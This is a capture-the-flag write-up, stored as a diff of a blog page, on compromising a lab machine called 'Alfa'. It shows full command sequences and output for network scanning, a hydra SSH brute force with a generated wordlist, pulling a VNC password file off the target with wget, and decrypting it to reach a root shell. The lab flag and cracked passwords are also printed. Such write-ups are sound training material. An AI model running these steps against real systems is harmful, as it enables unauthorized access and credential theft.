@@ -1,0 +1,271 @@
+I">R<p>This machine was created by <strong>d4t4s3c</strong>, we need to find a way to compromise the system and get root.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>The target host was located with a ping scan, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.167 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>A full TCP port scan was performed with nmap to find available ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.167 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT      STATE SERVICE
+21/tcp    open  ftp
+80/tcp    open  http
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+65111/tcp open  unknown
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>Service detection and script scanning were performed against the target to list more specific information about each port.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,80,139,445,65111 192.168.179.167 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_drwxr-xr-x    2 0        0            4096 Dec 17  2020 thomas
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.179.1
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp    open  http        Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods:
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Alfa IT Solutions
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+65111/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 ad:3e:8d:45:48:b1:63:88:63:47:64:e5:62:28:6d:02 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 1d:b3:0c:ca:5f:22:a4:17:d6:61:b5:f7:2c:50:e9:4c <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 42:15:88:48:17:42:69:9b:b6:e1:4e:3e:81:0b:68:0c <span class="o">(</span>ED25519<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+
+<p>As we can see the anonymous login is enabled, so I mounted the FTP service locally, copied the thomas directory to my current directory, this contains the image of a dog named milo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>curlftpfs anonymous:@192.168.179.167 /mnt/ftp
+root@kali:~/alfa<span class="nv">$ </span><span class="nb">ls</span> /mnt/ftp 
+thomas
+root@kali:~/alfa<span class="nv">$ </span><span class="nb">cp</span> <span class="nt">-r</span> /mnt/ftp/thomas <span class="nb">.</span>
+root@kali:~/alfa<span class="nv">$ </span><span class="nb">ls </span>thomas         
+milo.jpg
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Visiting the home page of the web application I didn’t find anything, so I decided request the robots.txt file and found some directories and a string in brainfuck language.</p>
+
+<p><img src="/assets/images/alfa/screenshot-1.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.167/robots.txt | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'1,8p;$p'</span>
+/home
+/admin
+/login
+/images
+/cgi-bin
+/intranet
+/wp-admin
+/wp-login
+++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++<span class="o">&lt;&lt;&lt;</span>&lt;-]&gt;&gt;+++++++++++++++++.&gt;&gt;---.+++++++++++.------.-----.&lt;&lt;<span class="nt">--</span>.&gt;&gt;++++++++++++++++++.++.-----..-.+++.++.
+</code></pre></div></div>
+
+<p>I decoded it, and accessed the <strong>/alfa-support</strong> directory.</p>
+
+<p><img src="/assets/images/alfa/screenshot-2.png" alt="" /></p>
+
+<p>This contains a dialogue where Tomas states that he only remembers part of his password which is the name of his pet followed by three numbers, asking to reset his password.</p>
+
+<p><img src="/assets/images/alfa/screenshot-3.png" alt="" /></p>
+
+<p>We can use those specifications to create our dictionary of words, a oneliner bash script could do that for us.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span><span class="k">for </span>x <span class="k">in</span> <span class="o">{</span>000..999<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo </span>milo<span class="nv">$x</span><span class="p">;</span><span class="k">done</span> <span class="o">&gt;</span> thomas.pass
+</code></pre></div></div>
+
+<h3 id="samba-enumeration">Samba Enumeration</h3>
+
+<p>By Listing the Samba service, it was possible to verify that Thomas is a local user of the system.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.167
+...
+S-1-22-1-1000 Unix User<span class="se">\t</span>homas <span class="o">(</span>Local User<span class="o">)</span> 
+</code></pre></div></div>
+
+<p>The most logical thing would be to brute force the SSH service.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>hydra <span class="nt">-l</span> thomas <span class="nt">-P</span> thomas.pass ssh://192.168.179.167:65111
+...
+<span class="o">[</span>65111][ssh] host: 192.168.179.167   login: thomas   password: milo666
+1 of 1 target successfully completed, 1 valid password found
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<p>As we can see above the password of Thomas was found and we accessed via SSH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>ssh <span class="nt">-l</span> thomas 192.168.179.167 <span class="nt">-p</span> 65111
+thomas@192.168.179.167<span class="s1">'s password:                                                                                                                                  
+Linux Alfa 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64                                                                                             
+                                                                                                                                                                    
+####################################################################                                                                                                
+#                  ,---------------------------,                   #                                                                                                
+#                  |  /---------------------\  |                   #                                                                                                
+#                  | |                       | |                   #                                                                                                
+#                  | |         +----+        | |                   #                                                                                                
+#                  | |         |ALFA|        | |                   #                                                                                                
+#                  | |         +----+        | |                   #                                                                                                
+#                  | |                       | |                   #                                                                                                
+#                  |  \_____________________/  |                   #                                                                                                
+#                  |___________________________|                   #                                                                                                
+#                ,---\_____     []     _______/------,             #                                                                                                
+#              /         /______________\           /|             #                                                                                                
+#            /___________________________________ /  | ___         #                                                                                                
+#            |                                   |   |    )        #                                                                                                
+#            |  _ _ _                 [-------]  |   |   (         #                                                                                                
+#            |  o o o                 [-------]  |  /    _)_       #                                                                                                
+#            |__________________________________ |/     /  /       #                                                                                                
+#        /-------------------------------------/|      ( )/        #                                                                                                
+#      /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                   #
+#    /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                     #
+#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       #
+#  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗  #
+#  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝  #
+#  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗    #
+#  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝    #
+#  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  #
+#   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  #
+####################################################################
+
+thomas@Alfa:~$
+</span></code></pre></div></div>
+
+<p>The first flag was located in the home directory of Thomas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@Alfa:~<span class="nv">$ </span><span class="nb">ls
+</span>user.txt
+thomas@Alfa:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+
+
+.-----------------------------------------------------------------------------.
+<span class="o">||</span>Es| |F1 |F2 |F3 |F4 |F5 | |F6 |F7 |F8 |F9 |F10|                             |
+<span class="o">||</span>__| |___|___|___|___|___| |___|___|___|___|___|                             |
+| _____________________________________________     ________    ___________   |
+<span class="o">||</span>~  |! |<span class="s2">" |§ |</span><span class="nv">$ </span><span class="s2">|% |&amp; |/ |( |) |= |? |</span><span class="sb">`</span> <span class="o">||</span> |&lt;-|   |Del|Help|  |<span class="o">{</span> |<span class="o">}</span> |/ |<span class="k">*</span> |  |
+<span class="o">||</span><span class="sb">`</span><span class="s2">__|1_|2_|3_|4_|5_|6_|7_|8_|9_|0_|ß_|´_|</span><span class="se">\_</span><span class="s2">|__|   |___|____|  |[ |]_|__|__|  |
+||&lt;-  |Q |W |E |R |T |Z |U |I |O |P |Ü |* |   ||               |7 |8 |9 |- |  |
+||-&gt;__|__|__|__|__|__|__|__|__|__|__|__|+_|_  ||               |__|__|__|__|  |
+||Ctr|oC|A |S |D |F |G |H |J |K |L |Ö |Ä |^ |&lt;'|               |4 |5 |6 |+ |  |
+||___|_L|__|__|__|__|__|__|__|__|__|__|__|#_|__|       __      |__|__|__|__|  |
+||^    |&gt; |Y |X |C |V |B |N |M |; |: |_ |^     |      |A |     |1 |2 |3 |E |  |
+||_____|&lt;_|__|__|__|__|__|__|__|,_|._|-_|______|    __||_|__   |__|__|__|n |  |
+|   |Alt|A  |                       |A  |Alt|      |&lt;-|| |-&gt;|  |0    |. |t |  |
+|   |___|___|_______________________|___|___|      |__|V_|__|  |_____|__|e_|  |
+|                                                                             |
+</span><span class="sb">`</span><span class="nt">-----------------------------------------------------------------------------</span><span class="s1">'
+
+
+user_flag==&gt;&gt; M4Mh5FX8EGGGSV6CseRuyyskG
+
+</span></code></pre></div></div>
+
+<p>Listing the services, there’s one running locally on port 5901.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@Alfa:~<span class="nv">$ </span>ss <span class="nt">-antl</span>                                                                                           
+State                 Recv-Q                Send-Q                 Local Address:Port                  Peer Address:Port
+LISTEN                0                     128                          0.0.0.0:65111                      0.0.0.0:<span class="k">*</span>
+LISTEN                0                     50                           0.0.0.0:445                        0.0.0.0:<span class="k">*</span>
+LISTEN                0                     50                           0.0.0.0:139                        0.0.0.0:<span class="k">*</span>
+LISTEN                0                     5                          127.0.0.1:5901                       0.0.0.0:<span class="k">*</span>
+LISTEN                0                     32                                 <span class="k">*</span>:21                               <span class="k">*</span>:<span class="k">*</span>
+LISTEN                0                     128                             <span class="o">[</span>::]:65111                         <span class="o">[</span>::]:<span class="k">*</span>
+LISTEN                0                     50                              <span class="o">[</span>::]:445                           <span class="o">[</span>::]:<span class="k">*</span>
+LISTEN                0                     50                              <span class="o">[</span>::]:139                           <span class="o">[</span>::]:<span class="k">*</span>
+LISTEN                0                     5                              <span class="o">[</span>::1]:5901                          <span class="o">[</span>::]:<span class="k">*</span>
+LISTEN                0                     128                                <span class="k">*</span>:80                               <span class="k">*</span>:<span class="k">*</span>
+</code></pre></div></div>
+
+<p>Local Port Forwarding allow me to connect from the local machine to another server securely, so all data sent to port 4444 on attacking machine is forwarded to port 5901 on target host.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>ssh <span class="nt">-L</span> 127.0.0.1:4444:127.0.0.1:5901 <span class="nt">-l</span> thomas 192.168.179.167 <span class="nt">-p</span> 65111 <span class="nt">-N</span>
+thomas@192.168.179.167<span class="s1">'s password:
+</span></code></pre></div></div>
+
+<p>Locally we can check that port 4444 is listening.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>ss <span class="nt">-antl</span> | <span class="nb">grep </span>4444
+LISTEN 0      128        127.0.0.1:4444      0.0.0.0:<span class="k">*</span> 
+</code></pre></div></div>
+
+<p>Service enumeration and script scanning was performed locally on port 4444 to detect which service is running on it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p4444</span> 127.0.0.1
+...
+PORT     STATE SERVICE VERSION
+4444/tcp open  vnc     VNC <span class="o">(</span>protocol 3.8<span class="o">)</span>
+</code></pre></div></div>
+
+<p>In the previous result we can see that the VNC service is running, also in the home directory of Thomas the <strong>.remote_secret</strong> file was found.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@Alfa:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>   
+...
+<span class="nt">-rwxrwxrwx</span> 1 root   root     16 dic 17  2020 .remote_secret 
+...
+</code></pre></div></div>
+
+<p>We start a web server with python on target machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@Alfa:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
+</code></pre></div></div>
+
+<p>We download it to the attacking machine with wget.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>wget 192.168.179.167:8000/.remote_secret
+</code></pre></div></div>
+
+<h2 id="privile-escalation">Privile Escalation</h2>
+<h3 id="access-via-vnc">Access via VNC</h3>
+
+<p>We connect to VNC using the <strong>.remote_secret</strong> file as password, and we have access to a root shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>vncviewer <span class="nt">-passwd</span> .remote_secret 127.0.0.1:4444
+</code></pre></div></div>
+
+<p><img src="/assets/images/alfa/screenshot-4.png" alt="" /></p>
+
+<p>To know the password in plain text we can use VNC password decrypter, for this we download the following repository, compile it and execute it, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/alfa<span class="nv">$ </span>git clone https://github.com/jeroennijhof/vncpwd
+Cloning into <span class="s1">'vncpwd'</span>...
+remote: Enumerating objects: 28, <span class="k">done</span><span class="nb">.</span>
+remote: Total 28 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 28
+Receiving objects: 100% <span class="o">(</span>28/28<span class="o">)</span>, 22.15 KiB | 9.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+root@kali:~/alfa<span class="nv">$ </span><span class="nb">cd </span>vncpwd 
+root@kali:~/alfa/vncpwd<span class="nv">$ </span>make
+gcc <span class="nt">-Wall</span> <span class="nt">-g</span> <span class="nt">-o</span> vncpwd vncpwd.c d3des.c
+root@kali:~/alfa/vncpwd<span class="nv">$ </span>./vncpwd ../.remote_secret 
+Password: k!LL3rSs
+</code></pre></div></div>
+:ET
